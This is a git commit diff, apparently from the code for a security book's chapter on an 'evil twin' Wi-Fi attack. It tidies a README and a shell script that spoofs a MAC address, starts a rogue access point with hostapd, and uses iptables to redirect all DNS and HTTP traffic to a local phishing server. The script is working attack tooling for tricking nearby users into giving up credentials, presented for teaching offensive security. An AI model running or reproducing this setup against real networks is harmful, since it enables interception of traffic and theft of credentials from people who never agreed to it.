7e496ca87edb97ab5a97be878528c92a0b14ec63
Sylvain Kerkour <sylvain@kerkour.com>
2021-11-13 16:25:17 +0000

    ch_09/evil_twin: cleanup

--- ch_09/evil_twin/README.md
+++ ch_09/evil_twin/README.md
@@ -5,6 +5,6 @@ On a Raspberry Pi with Rust installed
 ```shell
 $ sudo apt install -y macchanger hostapd dnsmasq sqlite3
 $ make -C ../phishing/ && cp -r ../phishing/dist/* .
-$ sudo ./server -p 80
+$ sudo ./server -p 80 &
 $ sudo ./evil_twin.sh
 ```
--- ch_09/evil_twin/evil_twin.sh
+++ ch_09/evil_twin/evil_twin.sh
@@ -1,15 +1,14 @@
+echo "Changing wlan0's MAC address"
 ifconfig wlan0 down
-
 macchanger -A wlan0
-
 ifconfig wlan0 up
 
+echo "Starting access point"
 hostapd -B hostapd.conf
 
+echo "Configuring bhr0 network interface"
 ifconfig bhr0 up
-
 ifconfig bhr0 10.1.1.1 netmask 255.255.255.0
-
 sysctl net.ipv4.ip_forward=1
 iptables --flush
 iptables -t nat --flush
@@ -17,7 +16,7 @@ iptables -t nat -A PREROUTING -i bhr0 -p udp -m udp --dport 53 -j DNAT --to-dest
 iptables -t nat -A PREROUTING -i bhr0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
 iptables -t nat -A POSTROUTING -j MASQUERADE
 
-
+echo "Starting dnsmasq"
 cp -f dnsmasq.conf /etc
 service dnsmasq start
 service dnsmasq restart
